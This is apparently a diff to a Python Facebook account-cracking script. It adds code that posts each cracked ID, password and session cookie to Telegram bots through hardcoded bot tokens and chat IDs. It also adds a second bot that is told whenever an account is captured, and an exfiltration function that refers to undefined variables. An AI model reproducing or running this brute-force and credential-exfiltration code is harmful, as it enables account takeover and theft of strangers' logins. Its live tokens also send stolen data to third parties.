@@ -443,8 +443,21 @@ def uaku():
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
-token='6528578805:AAHVqYlWkpOtrj7SZ2ySxGplrTpKdBW5eTY'
-ID='6931782492'
+kld='6528578805:AAHVqYlWkpOtrj7SZ2ySxGplrTpKdBW5eTY'
+sos='6931782492'
+def Elite(id,ps,coki):
+    try:
+        import requests
+        token = "6528578805:AAHVqYlWkpOtrj7SZ2ySxGplrTpKdBW5eTY"#Add yout token 
+        chatid = "6931782492"#Add your Chat Id
+        ok_id =str(idf+"|"+pw+"|"+kuki)
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        params = {"chat_id": chatid, "text": ok_id}
+        requests.get(url, params=params)
+    except:
+        pass
+
+#»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
 #------------[ WARNA-COLOR ]--------------#
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -4524,6 +4537,9 @@ def _flame_(u):
         
 #------------[ INDICATION ]---------------#
 #COLOR-CODE
+moon='6033991673:AAEEmcP9KcaTVuaF8fs6szeaB80KFggfHFc'
+sun='1701727785'
+
 BM = '\x1b[1;97m'
 P = '\x1b[1;91m'
 M = '\x1b[1;97m'
@@ -5235,6 +5251,9 @@ def crack(idf,pwv):
 				cp+=1
 				akun.append(idf + '|' + pw)
 				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(ali))
+				soso = f'''
+				صاحب الايدي صاد حساب (ID)'''
+				requests.get('https://api.telegram.org/bot' + str(moon) + '/sendMessage?chat_id=' + str(sun) + '&text=' + str(soso))
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
@@ -5253,6 +5272,9 @@ def crack(idf,pwv):
 				cetak(nel(statusok1, title='OK'))
 				open('/sdcard/𝚁𝙾𝚁-𝙾𝙺.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')
 				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(rajy))
+				sara = f'''
+				صاحب الايدي صاد حساب (ID)'''
+				requests.get('https://api.telegram.org/bot' + str(moon) + '/sendMessage?chat_id=' + str(sun) + '&text=' + str(sara))
 				break
 				
 			else:
